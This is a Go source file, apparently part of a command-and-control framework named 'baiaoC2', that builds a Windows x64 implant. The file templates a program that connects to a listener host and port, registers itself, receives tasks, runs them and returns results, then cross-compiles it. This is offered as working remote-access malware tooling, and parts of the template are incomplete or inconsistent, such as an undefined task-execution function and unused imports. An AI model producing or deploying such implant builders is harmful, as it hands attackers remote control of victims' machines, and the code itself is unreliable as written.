package payload

import (
	"baiaoC2/shared/crypto"
	"baiaoC2/shared/protocol"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
)

// Payload representa o payload que será enviado para o implante
type Payload struct {
	ListenerHost string
	ListenerPort int
	SessionKey   []byte
	ServerKey    string
}

// GenerateWindowsPayload gera um payload para Windows x64
func GenerateWindowsPayload(listenerHost string, listenerPort int, serverKey string, outputPath string) error {
	// Gerar chave de sessão
	sessionKey := crypto.GenerateSessionKey()

	// Criar payload
	payload := fmt.Sprintf(`
package main

import (
	"baiaoC2/shared/crypto"
	"baiaoC2/shared/protocol"
	"net"
)

func main() {
	conn, err := net.Dial("tcp", "%s:%d")
	if err != nil {
		return
	}

	// Enviar chave de sessão
	err = protocol.SendSessionKey(conn, "%s", "%s")
	if err != nil {
		return
	}

	// Registrar implante
	implant := protocol.RegisterImplant(conn, "%s")

	// Processar tarefas
	for {
		task, err := protocol.ReceiveTask(conn, "%s")
		if err != nil {
			return
		}

		// Executar tarefa
		result := ExecuteTask(task)
		err = protocol.SendTaskResult(conn, result, "%s")
		if err != nil {
			return
		}
	}
}
`, listenerHost, listenerPort, hex.EncodeToString(sessionKey), serverKey, hex.EncodeToString(sessionKey), hex.EncodeToString(sessionKey), hex.EncodeToString(sessionKey))

	// Escrever payload em um arquivo temporário
	tmpFile := "tmp_payload.go"
	err := os.WriteFile(tmpFile, []byte(payload), 0644)
	if err != nil {
		return err
	}
	defer os.Remove(tmpFile)

	// Compilar payload para Windows x64
	cmd := exec.Command("go", "build", "-o", outputPath, tmpFile)
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
	err = cmd.Run()
	if err != nil {
		return err
	}

	return nil
}
